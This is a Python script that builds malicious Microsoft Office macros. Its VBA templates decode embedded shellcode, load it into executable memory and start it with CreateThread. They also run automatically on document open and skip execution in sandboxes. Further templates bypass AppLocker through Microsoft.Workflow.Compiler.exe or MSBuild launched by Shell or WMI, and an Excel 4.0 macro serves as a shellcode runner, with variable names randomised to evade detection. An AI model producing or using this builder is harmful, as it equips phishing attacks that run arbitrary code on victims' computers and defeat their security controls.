import os, sys, argparse, math, string, random

word_macro_caesar = """
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocation As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal IDestination As LongPtr, ByRef sSource As Any, ByVal ILength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function MyMacro()
  Dim buf As Variant
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As Long
  Dim t1 As Date
  Dim t2 As Date
  Dim time As Long
  
  t1 = Now()
  Sleep (2000)
  t2 = Now()
  time = DateDiff("s", t1, t2)
  If time < 2 Then
    Exit Function
  End If

  buf = Array(%s)
  
  For i = 0 To UBound(buf) 
    buf(i) = (buf(i) - %s) And HFF
  Next i
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
  For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter
  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
"""

rundotxml = """
Function writeRunDotXML()
  strPath = Environ("TEMP") + "\\run.xml"
  Dim fso As Object
  Set fso = CreateObject("Scripting.FileSystemObject")
  Dim oFile As Object
  Set oFile = fso.CreateTextFile(strPath)
  oFile.WriteLine "<?xml version=""1.0"" encoding=""utf-8""?>"
  oFile.WriteLine "<CompilerInput xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler"">"
  oFile.WriteLine "  <files xmlns:d2p1=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">"
  oFile.WriteLine "    <d2p1:string>%s</d2p1:string>"
  oFile.WriteLine "  </files>"
  oFile.WriteLine "  <parameters xmlns:d2p1=""http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler"">"
  oFile.WriteLine "    <assemblyNames xmlns:d3p1=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"" xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"" />"
  oFile.WriteLine "    <compilerOptions i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"" />"
  oFile.WriteLine "    <coreAssemblyFileName xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler""></coreAssemblyFileName>"
  oFile.WriteLine "    <embeddedResources xmlns:d3p1=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"" xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"" />"
  oFile.WriteLine "    <evidence xmlns:d3p1=""http://schemas.datacontract.org/2004/07/System.Security.Policy"" i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"" />"
  oFile.WriteLine "    <generateExecutable xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"">false</generateExecutable>"
  oFile.WriteLine "    <generateInMemory xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"">true</generateInMemory>"
  oFile.WriteLine "    <includeDebugInformation xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"">false</includeDebugInformation>"
  oFile.WriteLine "    <linkedResources xmlns:d3p1=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"" xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"" />"
  oFile.WriteLine "    <mainClass i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"" />"
  oFile.WriteLine "    <outputName i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"" />"
  oFile.WriteLine "    <tempFiles i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"" />"
  oFile.WriteLine "    <treatWarningsAsErrors xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"">false</treatWarningsAsErrors>"
  oFile.WriteLine "    <warningLevel xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"">-1</warningLevel>"
  oFile.WriteLine "    <win32Resource i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"" />"
  oFile.WriteLine "    <d2p1:checkTypes>false</d2p1:checkTypes>"
  oFile.WriteLine "    <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>"
  oFile.WriteLine "    <d2p1:compilerOptions i:nil=""true"" />"
  oFile.WriteLine "    <d2p1:generateCCU>false</d2p1:generateCCU>"
  oFile.WriteLine "    <d2p1:languageToUse>CSharp</d2p1:languageToUse>"
  oFile.WriteLine "    <d2p1:libraryPaths xmlns:d3p1=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"" i:nil=""true"" />"
  oFile.WriteLine "    <d2p1:localAssembly xmlns:d3p1=""http://schemas.datacontract.org/2004/07/System.Reflection"" i:nil=""true"" />"
  oFile.WriteLine "    <d2p1:mtInfo i:nil=""true"" />"
  oFile.WriteLine "    <d2p1:userCodeCCUs xmlns:d3p1=""http://schemas.datacontract.org/2004/07/System.CodeDom"" i:nil=""true"" />"
  oFile.WriteLine "  </parameters>"
  oFile.WriteLine "</CompilerInput>"
  oFile.Close
  Set fso = Nothing
  Set oFile = Nothing
End Function
"""

firstpart = '''
Function writePart%s()
  strPath = Environ("TEMP") + "\\%s"
  Dim fso As Object
  Set fso = CreateObject("Scripting.FileSystemObject")
  Dim oFile As Object
  Set oFile = fso.CreateTextFile(strPath)'''

endpart = '''oFile.Close
  Set fso = Nothing
  Set oFile = Nothing
End Function'''

middlepart = '''oFile.Close
  Set fso = Nothing
  Set oFile = Nothing
End Function

Function writePart%s()
  strPath = "%s"
  Dim fso As Object
  Const fsoForAppend = 8
  Set fso = CreateObject("Scripting.FileSystemObject")
  Dim oFile As Object
  Set oFile = fso.OpenTextFile(strPath, fsoForAppend)'''

workflowcompiler_shell = '''
  writeRunDotXML
  tt = Environ("TEMP") +  "\\%s"
  rx = Environ("TEMP") +  "\\%s"
  Shell "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe " + rx + " res", vbHide
End Function
  '''

workflowcompiler_wmi = '''
  writeRunDotXML
  tt = Environ("TEMP") +  "\\%s"
  rx = Environ("TEMP") +  "\\%s"
  cmd_obj = "winmgmts:Win32_Process"
  cmd_str = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe " + rx + " out"
  GetObject(cmd_obj).Create cmd_str, Null, Null, pid
End Function
'''

msbuild_shell = '''
  cp = Environ("TEMP") + "\\%s"
  Shell "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\MSBuild.exe " + cp
End Function
'''

msbuild_wmi = '''
  cp = Environ("TEMP") + "\\%s"
  cmd_obj = "winmgmts:Win32_Process"
  cmd_str = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\MSBuild.exe " + cp
  GetObject(cmd_obj).Create cmd_str, Null, Null, pid
End Function
'''

wait_func = '''
Sub Wait(n As Long)
 Dim t As Date
 t = Now
 Do
 DoEvents
 Loop Until Now >= DateAdd("s", n, t)
End Sub
'''

word_auto_open = '''
Sub Document_Open()
  bypass
End Sub
Sub AutoOpen()
  bypass
End Sub
'''

xlm4macro = """
=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(R2C1),GOTO(R16C1))
=REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)
=Valloc(0,1000000,%s,64)
=REGISTER("Kernel32", "WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)
=SELECT(R1C2:R1000:C2,R1C2)
=SET.VALUE(R1C3,0)
=WHILE(ACTIVE.CELL()<>"END_STRING")
=WProcessMemory(-1,R3C1+R1C3*255,ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)
=SET.VALUE(R1C3,R1C3+1)
=SELECT(,"R[1]C")
=NEXT()
=REGISTER("Kernel32","CreateThread","JJJJJJJ","Cthread",,1,9)
=Cthread(0,0,R3C1,0,0,0)
=REGISTER("Kernel32","VirtualProtect","JJJJJ","Vprotect",,1,9)
=Vprotect(R3C1,%s,4,0)
=HALT()
"""

def format_shellcode_caesar(shellcode, k): 
    # adds k to each byte
    hshellcode = ""
    code_size = len(shellcode)                                                                                                                                                                                                                                                                                                                                                                       
    for num, byte in enumerate(shellcode):       
        if num%50 == 0 and num != 0: hshellcode += "_\n";                                                                                                                                                                                                                                                                                                                                           
        if num == 0: # first
            hshellcode += f"{(byte+k)&0xff}, "
        if num > 0 and num < code_size -2: # middle
            hshellcode += f"{(byte+k)&0xff}, "
        if num == code_size - 1: # last
            hshellcode += f"{(byte+k)&0xff}"
    return hshellcode

def format_shellcode_for_xlm4(shellcode):
    # what an abortion. I thought there were comma seperators. then there was a trailing comma problem                 
    hshellcode = "="                                                                                                                                                                                                                                                                                                                                                                                  
    code_size = len(shellcode)
    s = 0
    for num, byte in enumerate(shellcode):
        if num != 0 and num%255 == 0: hshellcode += f"\n\n=CHAR({byte})" ;continue # limited to 255 char per cell
        if num > 1 and num%255 == 254:hshellcode += f"&CHAR({byte})" ;continue 
        if num>0: 
            hshellcode += f"&CHAR({byte})"                                                                                                                                                                                                                                                                                                                                                            
        if num == 0:                                                                                                                                                                                                                                                                                                                                                                                        
            hshellcode += f"CHAR({byte})" 
        if num == code_size-1: hshellcode += f"&CHAR({byte})"
    return hshellcode

def rand_vars(source, *source_vars):
    # vars can't be included in other words ie func and function or shit gets fucked up
    letters = string.ascii_letters
    for i in source_vars:
        source = source.replace(i, ''.join(random.choice(letters) for i in range(random.randint(10,22))), -1)
    return source

verbose = False
parser = argparse.ArgumentParser(description="help create office macro")
parser.add_argument('-infile', type=str, help="bin file or Program.cs file depending on type")
parser.add_argument('--outfile', type=str, default="out.txt")
parser.add_argument('--filename', type=str, default="brax.txt")
parser.add_argument('--type', type=str, choices=['word_macro_caesar', 'word_macro_workflow_compiler', 'word_macro_msbuild','xlm4_macro_runner'], default="word_macro_caesar")
parser.add_argument('--exectype', type=str, choices=['shell', 'wmi'], default="shell")
parser.add_argument('--verbose', default=False, action='store_true', dest='verbose')
parser.add_argument('--caesar_key', default=2, type=int)
args = parser.parse_args()

if args.type == "word_macro_caesar": # not tested yet
    k = args.caesar_key
    hshellcode = ""
    with open(args.infile, "rb") as file:
        data = file.read()
    e_shc = format_shellcode_caesar(data, k)
    out = word_macro_caesar % (e_shc, k)
    rand_vars(out, "buf", "addr", "counter", "data", "res", "t1", "t2", "time")
    print(out)

if args.type == "word_macro_workflow_compiler": # applocker (workflow.compiler)
    # creating function to write .NET source
    count = 0
    parts = 1
    with open(args.infile, "r") as f: # infile here
        out = firstpart % (parts, args.filename)
        print(out) 
        while True:
            line = f.readline()
            newline = line.replace("\"", "\"\"")
            if not line:
                # out = vv % str(count/2000)[0]
                print(endpart)
                break

            count = count + 1
            n = count%2000
            if (n == 0):
                parts += 1
                out = middlepart % (str(count/2000)[0], f"Environ(\"TEMP\") + {args.filename}")
                print(out)
            if newline != "\n":
                print("  oFile.WriteLine \"{}\"".format(newline.strip("\n")))
    # configure and print run.xml (workflow.compiler bypass component)
    out = rundotxml % args.filename
    print("\n")
    print(out)
    print("\n")
    # creating bypass function specific to workflow.compiler bypass
    print("Function bypass()")
    while parts > 0:
        n = 1
        print("  writePart"+str(n))
        parts -= 1
        n +=1
    if args.exectype == "shell":
        out = workflowcompiler_shell % (args.filename, "run.xml")
        print(out)
    if args.exectype == "wmi":
        out = workflowcompiler_wmi % (args.filename, "run.xml")
    print(word_auto_open)

if args.type == "word_macro_msbuild":
    # creating function to write .NET source
    count = 0
    parts = 1
    with open(args.infile, "r") as f: # infile here
        out = firstpart % (parts, "brax.csproj")
        print(out) 
        while True:
            line = f.readline()
            newline = line.replace("\"", "\"\"")
            if not line:
                print(endpart)
                break

            count = count + 1
            n = count%2000
            if (n == 0):
                parts += 1
                out = middlepart % (str(count/2000)[0], f"Environ(\"TEMP\") + {args.filename}")
                print(out)
            if newline != "\n":
                print("  oFile.WriteLine \"{}\"".format(newline.strip("\n")))
    print("Function bypass()")
    while parts > 0:
        n = 1
        print("  writePart"+str(n))
        parts -= 1
        n +=1
    
    if args.exectype == "shell": 
        out = msbuild_shell % "brax.csproj"
        print(out) 
    if args.exectype == "wmi": 
        out = msbuild_wmi % "brax.csproj"
        print(out)
    print(wait_func)
    print(word_auto_open)

if args.type == "xlm4_macro_runner":
    with open(args.infile, "rb") as file: data = file.read()
    n = math.ceil(len(data)/4096) * 4096
    out = xlm4macro % (n,n)
    print(out)
    res = format_shellcode_for_xlm4(data)
    rand_vars(out, "Valloc", "WProcessMemory", "Cthread", "Vprotect", "END_STRING")
    print(res)
